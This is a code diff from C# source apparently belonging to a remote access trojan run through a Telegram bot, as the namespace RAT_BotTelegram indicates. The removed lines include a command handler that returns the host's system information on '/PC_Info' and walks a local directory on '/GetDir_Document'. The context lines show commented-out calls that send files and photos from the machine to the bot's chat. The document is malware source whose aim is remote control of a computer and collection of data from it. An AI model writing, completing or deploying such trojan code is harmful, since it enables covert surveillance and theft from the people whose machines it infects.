@@ -33,9 +33,6 @@ namespace RAT_BotTelegram {
 
             //Método que se ejecuta cuando se recibe un error
             Bot.OnReceiveError += BotOnReceiveError;
-            string path = @"O:\OneDrive - xKx\Pictures\Gif\Windows logos.gif";
-
-
 
             //Bot.SendDocumentAsync(config.id, File.Open(path, FileMode.Open));
             //Bot.SendPhotoAsync(config.id, File.Open(path, FileMode.Open));
@@ -457,36 +454,6 @@ namespace RAT_BotTelegram {
                 receiveErrorEventArgs.ApiRequestException.ErrorCode,
                 receiveErrorEventArgs.ApiRequestException.Message);
         }
-        private static void Bot_OnMessagesdsd(object sender, Telegram.Bot.Args.MessageEventArgs e) {
-
-            if (e.Message.Type == Telegram.Bot.Types.Enums.MessageType.Text) {
-
-                if (e.Message.Text == "/PC_Info") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, Tools.PC_Info());
-
-                } else if (e.Message.Text == "/GetDir_Document") {
-
-
-
-                    //string[] allfiles = fea.GetFile(@"O:\OneDrive - xKx\Pictures")
-                    //string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
-                    //Tools.GetFile(@"O:\Estoo");
-                    //string[] authorsList = authors.Split(", ")
-                    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
-                        FileInfo info = new FileInfo(file);
-                        Console.WriteLine("File: " + info);
-                        Bot.SendTextMessageAsync(e.Message.Chat.Id, "" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
-                        // Bot.SendDocumentAsync(e.Message.Document.);
-                        // Do something with the Folder or just add them to a list via nameoflist.add();
-
-                    }
-
-         
-                }
-
-
-            }
-
-        }
+       
     }
 }
